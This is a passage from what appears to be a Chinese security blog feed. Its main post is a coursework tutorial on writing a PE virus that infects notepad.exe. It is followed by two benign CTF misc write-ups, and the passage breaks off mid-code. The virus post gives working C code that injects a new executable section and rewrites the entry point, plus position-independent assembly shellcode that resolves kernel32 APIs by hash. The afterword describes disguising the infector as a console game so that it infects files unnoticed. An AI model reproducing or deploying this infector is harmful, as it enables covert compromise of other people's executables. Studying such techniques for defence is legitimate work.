title="基本思路"></a>基本思路</h1><p>infect.exe的目标是向notepad.exe插入一段病毒载荷，也就是说我们要向一个已知的PE文件插入一段代码，使他能做到我们想要它做到的，但是实际上它并不应该能做到的功能。<br>一般来说PE病毒的载荷插入方式有两种，其一是在节之间插入，其二是新建节插入。<br>在节之间插入的好处是不用改entrypoint，在shellcode里不需要jmp回原本的entrypoint，基本上顺着执行原本的PE文件的过程中就可以将你的shellcode执行了，而缺点也显而易见，节之间的空间可能不足，可能出现无法植入shellcode的情况，而如果要利用多个节之间的空间的话就意味着载荷得分段执行，寄存器堆栈的状态都很可能变化，因此编写shellcode非常困难。<br>而新建节和节之间插入的优缺点刚好相反。相较之下更改entrypoint是比足够简单的，因此我们选择新建节植入shellcode。</p><h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>借鉴了网上很多的代码，大部分是使用handle非常便捷的修改了PE头的各个字段，而我由于太菜了加上正好需要具体理解PE格式，所以采用了很简单的文件指针的操作。</p><h2 id="新建节"><a href="#新建节" class="headerlink" title="新建节"></a>新建节</h2><p>由上一篇博客可知，新建节要修改的内容有</p><ol><li>PE头中的fileheader字段（IMAGE_NT_HEADERS.FileHeader的内容)</li><li>PE头中的optionalheader字段(IMAGE_NT_HEADERS.OptionalHeader的内容)</li><li>新节的节首部各个字段（IMAGE_SECTION_HEADER的各个内容）</li></ol><p>需要注意的是，由于我们多加了一个节头，这个接头会覆盖掉原本应该放IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT的位置，不过一般情况下这个地方是被保留的，全为0，因此我们只需将ntheader中指向这里的指针清空即可（也不能叫它指针吧），也就是将OptionalHeader.DataDirectory[11]的virtualaddress和size全清0。如果不清零的话，在装载PE程序的时候会装载器会报错。</p><p>具体代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IMAGE_SECTION_HEADER addsection(char *file)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER image_dos_header;</span><br><span class="line">    IMAGE_NT_HEADERS image_nt_headers;</span><br><span class="line">    IMAGE_SECTION_HEADER image_section_header; &#x2F;&#x2F; 用于存储新加的节表项</span><br><span class="line">    IMAGE_SECTION_HEADER old_section;          &#x2F;&#x2F; 存储旧的节表项</span><br><span class="line">    int num_section &#x3D; 0;</span><br><span class="line">    &#x2F;&#x2F;    byte sec[8]&#x3D;&quot;.txt&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    FILE *h;</span><br><span class="line">    h &#x3D; fopen(file, &quot;rb+&quot;);</span><br><span class="line">    fseek(h, 0, SEEK_SET);</span><br><span class="line">    fread(&amp;image_dos_header, sizeof(IMAGE_DOS_HEADER), 1, h);</span><br><span class="line">    fseek(h, image_dos_header.e_lfanew, SEEK_SET);</span><br><span class="line">    fread(&amp;image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h); &#x2F;&#x2F;PE头</span><br><span class="line">    &#x2F;&#x2F;printf(&quot;%d&quot;, sizeof(IMAGE_NT_HEADERS));</span><br><span class="line">    &#x2F;&#x2F;for (int a &#x3D; 0; a &lt;&#x3D; 15; a++)</span><br><span class="line">    &#x2F;&#x2F;  printf(&quot;%x,%x\n&quot;, image_nt_headers.OptionalHeader.DataDirectory[a].VirtualAddress, image_nt_headers.OptionalHeader.DataDirectory[a].Size);</span><br><span class="line"></span><br><span class="line">    num_section &#x3D; image_nt_headers.FileHeader.NumberOfSections;</span><br><span class="line">    fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (num_section - 1) * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);&#x2F;&#x2F; 跳到最后一个节表项</span><br><span class="line">    fread(&amp;old_section, sizeof(IMAGE_SECTION_HEADER), 1, h);  &#x2F;&#x2F; 存储最后一个节表项到old_section</span><br><span class="line"></span><br><span class="line">    image_nt_headers.FileHeader.NumberOfSections +&#x3D; 1;</span><br><span class="line">    image_section_header.Characteristics &#x3D; IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;</span><br><span class="line">    image_section_header.Misc.VirtualSize &#x3D; image_nt_headers.OptionalHeader.SectionAlignment;</span><br><span class="line">    &#x2F;&#x2F;bool x&#x3D;true;</span><br><span class="line">    for (int n &#x3D; 1; true; n++) &#123;</span><br><span class="line">        if (image_nt_headers.OptionalHeader.FileAlignment *n &gt; 520) break; </span><br><span class="line">        image_section_header.SizeOfRawData &#x3D; image_nt_headers.OptionalHeader.FileAlignment * n;</span><br><span class="line">        strcpy((char*)image_section_header.Name, &quot;.viru&quot;);</span><br><span class="line">        image_section_header.PointerToRawData &#x3D; alig(old_section.PointerToRawData + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.FileAlignment);</span><br><span class="line">        image_section_header.VirtualAddress &#x3D; alig(old_section.VirtualAddress + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);</span><br><span class="line">        fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + num_section * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);</span><br><span class="line">        fwrite(&amp;image_section_header, sizeof(IMAGE_SECTION_HEADER), 1, h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    image_nt_headers.OptionalHeader.SizeOfImage &#x3D; alig(image_section_header.VirtualAddress + image_section_header.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);</span><br><span class="line">    image_nt_headers.OptionalHeader.DataDirectory[11].VirtualAddress &#x3D; 0;</span><br><span class="line">    image_nt_headers.OptionalHeader.DataDirectory[11].Size &#x3D; 0;</span><br><span class="line">    fseek(h, image_dos_header.e_lfanew, SEEK_SET);</span><br><span class="line">    fwrite(&amp;image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h);</span><br><span class="line"></span><br><span class="line">    fseek(h, image_section_header.PointerToRawData, SEEK_SET);</span><br><span class="line">    byte *s &#x3D; (byte *)malloc(image_section_header.SizeOfRawData);</span><br><span class="line">    ZeroMemory((void *)s, image_section_header.SizeOfRawData);</span><br><span class="line">    fwrite(s, image_section_header.SizeOfRawData, 1, h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fclose(h);</span><br><span class="line"></span><br><span class="line">    return image_section_header;&#x2F;&#x2F; 返回病毒节</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改入口点"><a href="#修改入口点" class="headerlink" title="修改入口点"></a>修改入口点</h2><p>只需要将optionalheader中的addressofentrypoint改为新加节的rva即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD changeentry(DWORD entry,char* target) &#123;</span><br><span class="line">    FILE* fp &#x3D; fopen(target, &quot;rb+&quot;);</span><br><span class="line">    if (fp &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        &#x2F;&#x2F;printf(&quot;can not open file&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 获取dos头</span><br><span class="line">    IMAGE_DOS_HEADER dosHeader;</span><br><span class="line">    fread(&amp;dosHeader, 1, sizeof(dosHeader), fp);</span><br><span class="line">    &#x2F;&#x2F; 获取PE头</span><br><span class="line">    DWORD offsetPeHeader &#x3D; dosHeader.e_lfanew;</span><br><span class="line">    fseek(fp, offsetPeHeader, SEEK_SET);</span><br><span class="line">    IMAGE_NT_HEADERS ntHeader;</span><br><span class="line">    fread(&amp;ntHeader, 1, sizeof ntHeader, fp);</span><br><span class="line">    fseek(fp, offsetPeHeader, SEEK_SET);</span><br><span class="line">    DWORD old_entry;</span><br><span class="line">    old_entry &#x3D; ntHeader.OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">    ntHeader.OptionalHeader.AddressOfEntryPoint &#x3D; entry;</span><br><span class="line">    DWORD offset;</span><br><span class="line">    offset &#x3D; entry - old_entry;</span><br><span class="line">    fwrite(&amp;ntHeader, sizeof(ntHeader), 1, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h2><p>shellcode使用汇编写，由于我太菜了汇编能力低下，这里就参考了《0day安全_软件漏洞分析技术(第二版)》的代码。<br>因为我们是要创建一个文件，所以需要用到的函数只有kernel32.dll的CreateFileA函数，由此，我们的shellcode编写的步骤如下。</p><h3 id="获取kernel32-dll基址并读引入表以获得想要的函数"><a href="#获取kernel32-dll基址并读引入表以获得想要的函数" class="headerlink" title="获取kernel32.dll基址并读引入表以获得想要的函数"></a>获取kernel32.dll基址并读引入表以获得想要的函数</h3><p>首先我们需要获得kernel32.dll的位置，所有的win32程序都会加载ntdll.dll和kernel32.dll，进行以下步骤。<br>通过段选择字FS在内存中找到当前的线程环境块TEB<br>TEB偏移0x30的地方存着指向进程环境块PEB的指针<br>PEB偏移位置为0x0C的地方存放着PEB_LDR_DATA的指针，PEB_LDR_DATA结构体中存放着已经被进程装载的动态链接库信息，<br>PEB_LDR_DATA结构体偏移位置为0x1C指向模块初始化链表的头指针InInitializationOrderModuleList<br>InInitializationOrderModuleList中按照顺序存放和PE装入运行时初始化模块的信息，第一个链表结构是ntdll.dll，第二个节点就是kernel32.dll<br>kernel32.dll的节点偏移0x08就是kernel32.dll在内存中的加载基址<br>kernel32.dll的加载基址偏移0x3C就是kernel32.dll的PE头<br>PE头偏移0x78的地方存着指向函数导出表的指针<br>导出表偏移0x1C指向存储导出函数RVA的列表（IAT）<br>导出表偏移0x20指向存储导出函数名的列表（INT）<br>函数的RVA地址和名字按顺序存在这两个表中，我们可以在名称列表中定位到所需的函数的下标，然后在地址表里找到对应的RVA。<br>又由于我们已经得到了动态加载库的加载基址，就获得了所需API在内存中的虚拟地址。</p><h4 id="获取kernel32-dll的基地址"><a href="#获取kernel32-dll的基地址" class="headerlink" title="获取kernel32.dll的基地址"></a>获取kernel32.dll的基地址</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ebx, fs:[edx + 0x30]    ; ebx &#x3D; address of PEB </span><br><span class="line">mov ecx, [ebx + 0x0c]       ; ecx &#x3D; pointer to loader data </span><br><span class="line">mov ecx, [ecx + 0x1c]       ; ecx &#x3D; first entry in initialisation order list </span><br><span class="line">mov ecx, [ecx]              ; ecx &#x3D; second entry in list (kernel32.dll) </span><br><span class="line">mov ebp, [ecx + 0x08]       ; ebp &#x3D; base address of kernel32.dll </span><br></pre></td></tr></table></figure><h4 id="读取kernel32-dll的引入表"><a href="#读取kernel32-dll的引入表" class="headerlink" title="读取kernel32.dll的引入表"></a>读取kernel32.dll的引入表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lodsd                       ; load next hash into al and increment esi </span><br><span class="line">pushad                      ; preserve registers </span><br><span class="line">mov eax, [ebp + 0x3c]       ; eax &#x3D; start of PE header </span><br><span class="line">mov ecx, [ebp + eax + 0x78] ; ecx &#x3D; relative offset of export table </span><br><span class="line">add ecx, ebp                ; ecx &#x3D; absolute addr of export table </span><br><span class="line">mov ebx, [ecx + 0x20]       ; ebx &#x3D; relative offset of names table </span><br><span class="line">add ebx, ebp                ; ebx &#x3D; absolute addr of names table </span><br><span class="line">xor edi, edi                ; edi will count through the functions </span><br></pre></td></tr></table></figure><h3 id="寻找对应的函数"><a href="#寻找对应的函数" class="headerlink" title="寻找对应的函数"></a>寻找对应的函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inc edi                     ; increment function counter </span><br><span class="line">mov esi, [ebx + edi * 4]    ; esi &#x3D; relative offset of current function name </span><br><span class="line">add esi, ebp                ; esi &#x3D; absolute addr of current function name </span><br><span class="line">cdq                         ; dl will hold hash (we know eax is small)</span><br><span class="line">inc edi                     ; increment function counter </span><br><span class="line">mov esi, [ebx + edi * 4]    ; esi &#x3D; relative offset of current function name </span><br><span class="line">add esi, ebp                ; esi &#x3D; absolute addr of current function name </span><br><span class="line">cdq                         ; dl will hold hash (we know eax is small)  </span><br></pre></td></tr></table></figure><p>大家可能不理解hash是干啥的，由于我们win32程序使用的寄存器都是32位的，而我们要读取的函数的名称长度不一，所以我们使用哈希的方法来将长的函数名变成一个等长度的串，以便于cmp。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movsx eax, byte ptr[esi]</span><br><span class="line">cmp al,ah</span><br><span class="line">jz compare_hash</span><br><span class="line">ror edx,7</span><br><span class="line">add edx,eax</span><br><span class="line">inc esi</span><br><span class="line">jmp hash_loop</span><br></pre></td></tr></table></figure><p>而比较hash的函数如下，如果我们没找到的话就再拿下一个函数，让他hash然后再比较，如果找到了的话就去对应的IAT找他的绝对地址，并且将他push到edi栈的位置</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmp edx, [esp + 0x1c]       ; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">jnz next_function_loop </span><br><span class="line">mov ebx, [ecx + 0x24]       ; ebx &#x3D; relative offset of ordinals table </span><br><span class="line">add ebx, ebp                ; ebx &#x3D; absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi]     ; di &#x3D; ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c]       ; ebx &#x3D; relative offset of address table </span><br><span class="line">add ebx, ebp                ; ebx &#x3D; absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi]    ; add to ebp (base addr of module) the </span><br><span class="line">                            ; relative offset of matched function </span><br><span class="line">xchg eax, ebp               ; move func addr into eax </span><br><span class="line">pop edi                     ; edi is last onto stack in pushad </span><br><span class="line">stosd                       ; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad                   ; restore registers </span><br><span class="line">                        ; loop until we reach end of last hash </span><br><span class="line">cmp eax,0x1e380a6a</span><br><span class="line">jne find_lib_functions </span><br></pre></td></tr></table></figure><p>直到找完最后一个要找的函数的hash为止。</p><p>然后再最后用edi-几来调用对应的函数。<br>总体代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    _asm&#123;</span><br><span class="line">        nop;</span><br><span class="line">        CLD;</span><br><span class="line">        push 0x94e43293                     ;hash of CreateFileA</span><br><span class="line">        push 0x4fd18963                     ;hash of ExitProcess</span><br><span class="line">        mov esi, esp</span><br><span class="line">        lea edi, [esi-0x0c]</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        xor ebx, ebx</span><br><span class="line">        mov bh, 0x04</span><br><span class="line">        sub esp, ebx</span><br><span class="line"></span><br><span class="line">        mov bx,0x3233</span><br><span class="line">        push ebx</span><br><span class="line">        push 0x72657375</span><br><span class="line">        push esp</span><br><span class="line">        xor edx, edx</span><br><span class="line"></span><br><span class="line">    ; find base addr of kernel32.dll </span><br><span class="line">        mov ebx, fs:[edx + 0x30]    ; ebx &#x3D; address of PEB </span><br><span class="line">        mov ecx, [ebx + 0x0c]       ; ecx &#x3D; pointer to loader data </span><br><span class="line">        mov ecx, [ecx + 0x1c]       ; ecx &#x3D; first entry in initialisation order list </span><br><span class="line">        mov ecx, [ecx]              ; ecx &#x3D; second entry in list (kernel32.dll) </span><br><span class="line">        mov ebp, [ecx + 0x08]       ; ebp &#x3D; base address of kernel32.dll </span><br><span class="line"></span><br><span class="line">find_functions:</span><br><span class="line">        lodsd</span><br><span class="line">        pushad</span><br><span class="line">        mov eax, [ebp + 0x3c]</span><br><span class="line">        mov ecx, [ebp + eax + 0x78] </span><br><span class="line">        add ecx, ebp        </span><br><span class="line">        mov ebx, [ecx + 0x20]   </span><br><span class="line">        add ebx, ebp        </span><br><span class="line">        xor edi, edi        </span><br><span class="line"></span><br><span class="line">next_function_loop:</span><br><span class="line">        inc edi             </span><br><span class="line">        mov esi, [ebx + edi * 4]    </span><br><span class="line">        add esi, ebp        </span><br><span class="line">        cdq                 </span><br><span class="line"></span><br><span class="line">hash_loop:</span><br><span class="line">        movsx eax, byte ptr[esi]    </span><br><span class="line">        cmp al, ah          </span><br><span class="line">        jz compare_hash     </span><br><span class="line">        ror edx, 7          </span><br><span class="line">        add edx, eax        </span><br><span class="line">        inc esi             </span><br><span class="line">        jmp hash_loop       </span><br><span class="line"></span><br><span class="line">compare_hash:</span><br><span class="line">        cmp edx, [esp + 0x1c]       </span><br><span class="line">        jnz next_function_loop      </span><br><span class="line">        mov ebx, [ecx + 0x24]       </span><br><span class="line">        add ebx, ebp        </span><br><span class="line">        mov di, [ebx +2 * edi]      </span><br><span class="line">        mov ebx, [ecx + 0x1c]       </span><br><span class="line">        add ebx, ebp        </span><br><span class="line">        add ebp, [ebx + 4 * edi]    </span><br><span class="line">        xchg eax, ebp       </span><br><span class="line">        pop edi             </span><br><span class="line">        stosd               </span><br><span class="line"></span><br><span class="line">        push edi            </span><br><span class="line">        popad               </span><br><span class="line"></span><br><span class="line">        cmp eax, 0x94e43293 </span><br><span class="line">        jne find_functions  </span><br><span class="line"></span><br><span class="line">function_call:</span><br><span class="line">        push ebp;</span><br><span class="line">        mov ebp,esp;</span><br><span class="line">        mov esi,esp</span><br><span class="line">        sub esp,18h ;</span><br><span class="line">        mov dword ptr [ebp-18h],    ;数据脱敏 ~</span><br><span class="line">        mov dword ptr [ebp-14h],     </span><br><span class="line">        mov dword ptr [ebp-10h],   </span><br><span class="line">        mov dword ptr [ebp-0ch],</span><br><span class="line">        mov dword ptr [ebp-08h],   </span><br><span class="line">        mov dword ptr [ebp-04h],    </span><br><span class="line"></span><br><span class="line">        xor eax, eax</span><br><span class="line">        push eax</span><br><span class="line">        mov al, 0x82</span><br><span class="line">        push eax</span><br><span class="line">        mov al, 0x02</span><br><span class="line">        push eax</span><br><span class="line">        xor al, al</span><br><span class="line">        push eax</span><br><span class="line">        push eax</span><br><span class="line">        mov al, 0x40</span><br><span class="line">        sal eax, 0x18</span><br><span class="line">        push eax</span><br><span class="line">        lea eax,[ebp-18h] </span><br><span class="line">        push eax </span><br><span class="line">        call [edi - 0x04]</span><br><span class="line">        mov esp, esi</span><br><span class="line">        pop ebp</span><br><span class="line">        xor ebx, ebx</span><br><span class="line">        push ebx</span><br><span class="line">        call [edi - 0x0c]</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取shellcode的机器码"><a href="#获取shellcode的机器码" class="headerlink" title="获取shellcode的机器码"></a>获取shellcode的机器码</h2><p>编译上面的代码，然后将生成的exe放入OD，选择反汇编，在左下角即可看到我们输入的汇编，然后将他的机器码复制下来即可。</p><h2 id="将shellcode写入"><a href="#将shellcode写入" class="headerlink" title="将shellcode写入"></a>将shellcode写入</h2><p>简单的用fwrite往新节的pointertorawdata的位置写入shellcode即可。</p><h2 id="跳回原来的entrypoint"><a href="#跳回原来的entrypoint" class="headerlink" title="跳回原来的entrypoint"></a>跳回原来的entrypoint</h2><p>运行一下已经完成的程序，这会将notepad.exe写入shellcode，修改entrypoint，总之就是一切都完成了除了跳回原本的entrypoint。这时我们将notepad.exe放入OD，可以很快地找到我们的shellcode的汇编，然后慢慢走到最后，可以看到一个jmp指令，这个是PE装载器在装入这个节的时候自动加上的。我们记住这个指令的地址，然后用这个指令地址减去我们修改的入口点+5（这个指令的下一个指令的地址），然后再写入shellcode之后再加上一条对应的jmp指令即可。<br>至此，我们的shellcode注入就完成了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>后来我还把这个病毒程序所有的printf函数全注释掉，exit变成return，然后伪装成了一个简简单单的控制台小游戏，这样在你玩游戏的时候就会不知不觉的发现你同目录下的notepad.exe被感染了。而且本来跳回原来的entrypoint这个地方我是想让他自动实现的，可以看到我的changeentry函数返回了两个入口点之间的差值，但是我做到最后转念一想，我本来就是做了一个学习性质的感染程序，没必要啊，然后就没做，事实上只要我们得出了jmp的位置和修改后的entrypoint的差值，再加上两个入口点的差值，自动地写入jmp指令就可以了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;这是我软件安全作业，希望对想要学习PE病毒编写的同学们有所帮助。&lt;/p&gt;</summary>
    
    
    
    
    <category term="恶意代码" scheme="https://blog.pillar.fun/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-john-in-the-middle</title>
    <link href="https://blog.pillar.fun/2020/04/07/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-john-in-the-middle/"/>
    <id>https://blog.pillar.fun/2020/04/07/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-john-in-the-middle/</id>
    <published>2020-04-07T07:28:15.000Z</published>
    <updated>2022-04-02T07:41:15.610Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john in the middle"></a>john in the middle</h1><p>开局一个pcap</p><p><img src="/2020/04/07/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-john-in-the-middle/1.jpg" alt="img"></p><p>看一眼全是http，直接进行一个http对象的导出，得到一个网页文件</p><p><img src="/2020/04/07/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-john-in-the-middle/2.jpg" alt="img"></p><p>大概是个什么CTF比赛信息，谢谢赞助商blabla的</p><p>没什么头绪，拿stegsolve看看各个图片。</p><p>在plane0若有若无的看到了flag是john the sniffer，往后翻看到了更清晰的</p><p><img src="/2020/04/07/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-john-in-the-middle/3.jpg" alt="img"></p><p><img src="/2020/04/07/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-john-in-the-middle/4.jpg" alt="img"></p><p>flag{J0hn_th3_Sn1ff3r}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-喵喵喵</title>
    <link href="https://blog.pillar.fun/2020/04/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%96%B5%E5%96%B5%E5%96%B5/"/>
    <id>https://blog.pillar.fun/2020/04/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%96%B5%E5%96%B5%E5%96%B5/</id>
    <published>2020-04-04T09:22:33.000Z</published>
    <updated>2022-03-04T10:37:51.229Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h1><p>开局一张图，010editor打开，发现没什么东西藏着。</p><p>用stegsolve打开，在RGB的0panel都能明显看到隐写</p><p><img src="/2020/04/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%96%B5%E5%96%B5%E5%96%B5/1.jpg" alt="img"></p><p>经过一番尝试，在Row LSB BGR顺序可以发现一个PNG，存下来，发现无法查看，这是因为前面多了0xFFFE，用16进制吧FFFE删掉就行了。</p><p>打开发现是半张二维码</p><p><img src="/2020/04/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%96%B5%E5%96%B5%E5%96%B5/2.jpg" alt="img"></p><p>用16进制编辑器把长宽改一样。</p><p><img src="/2020/04/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%96%B5%E5%96%B5%E5%96%B5/3.jpg" alt="img"></p><p>扫描出来</p><p><img src="/2020/04/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%96%B5%E5%96%B5%E5%96%B5/4.jpg" alt="img"></p><p>下载内容，提示flag不在这里哦  你猜猜flag在哪里呢？  找找看吧。</p><p>回头再看了一眼二维码的16进制，并确定无常规隐写。</p><p>考虑到txt文件，有可能是ntfs数据流，用winrar解压，用ntfsstreamseditor</p><p><img src="/2020/04/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%96%B5%E5%96%B5%E5%96%B5/6.jpg" alt="img"></p><p>在线反编译</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;*************&#x27;</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        s = <span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="built_in">ord</span>(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(s))</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> ciphertext[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">&#x27;96&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;65&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;91&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;97&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;22&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;70&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;102&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;94&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;132&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;46&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;112&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;64&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;97&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;88&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;82&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;137&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;109&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;99&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;112&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单的re，写个代码求flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">&#x27;96&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;65&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;91&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;97&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;22&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;70&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;102&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;94&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;132&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;46&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;112&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;64&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;97&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;88&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;82&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;137&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;109&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;99&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;112&#x27;</span>][::-<span class="number">1</span>]</span><br><span class="line">flag=<span 